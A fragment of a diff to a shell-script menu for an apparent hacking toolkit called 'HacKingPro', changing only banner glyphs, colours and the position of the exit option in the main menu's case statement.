+          echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
           break
           ;;
-        esac
-      done
+          esac
+        done
+        }
+        ExploitationPro
       ;;
       05|5 )
       while true; do
@@ -9179,11 +9524,11 @@ MainMenu(){
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}]${BGreen} ╼ ${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
 
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} 🔮 ${BRed}]${BGreen}──╼ ${BGreen}   ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} 🔮 ${BRed}]${BYellow}╼▰  ${BGreen}   ")
 
         read -p "$HacKingProMenuMain" cmd
         case $cmd in
@@ -9224,11 +9569,11 @@ MainMenu(){
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}]${BGreen} ╼ ${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
 
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} 🔮 ${BRed}]${BGreen}──╼ ${BGreen}   ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} 🔮 ${BRed}]${BYellow}╼▰  ${BGreen}   ")
 
         read -p "$HacKingProMenuMain" cmd
         case $cmd in
@@ -9269,11 +9614,11 @@ MainMenu(){
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}]${BGreen} ╼ ${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
 
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} 🔮 ${BRed}]${BGreen}──╼ ${BGreen}   ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} 🔮 ${BRed}]${BYellow}╼▰  ${BGreen}   ")
 
         read -p "$HacKingProMenuMain" cmd
         case $cmd in
@@ -9310,11 +9655,11 @@ MainMenu(){
     ${ORANGE}${faintT}│
     ${ORANGE}${faintT}└───────────────────────────────${resetT}${BCyan}╼▰▰▰
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Xplorer Files Pro ${BRed}]${BGreen}──╼ ${BGreen}   ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Xplorer Files Pro ${BRed}]${BYellow}╼▰  ${BGreen}   ")
     read -p "${TargetStatus}" cmd
     case $cmd in
       1 )
@@ -9354,13 +9699,6 @@ MainMenu(){
       arsenal|Arsenal|cs|CS|cheats|Cheatsheets|CheatSheets|Commands|commands|zz )
       Arsenal
       ;;
-      x|X|exit|quit|Exit )
-      clear
-      cd ${MainDirectoriy}
-      HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
-      echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
-      break
-      ;;
       p|P )
       HacKingProPlanning
       ;;
@@ -9369,6 +9707,13 @@ MainMenu(){
       ;;
       ls )
       lahs
+      ;;
+      x|X|exit|quit|Exit )
+      clear
+      cd ${MainDirectoriy}
+      HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
+      echo "\n\t\t ${BRed}[🙏🏼${BRed}] ${BWhite}Exit ${HacKingPro} ${BRed}[🙏🏼${BRed}]\n\t\t ${BGreen}"
+      break
       ;;
       * )
       echo "$InvalidOption"
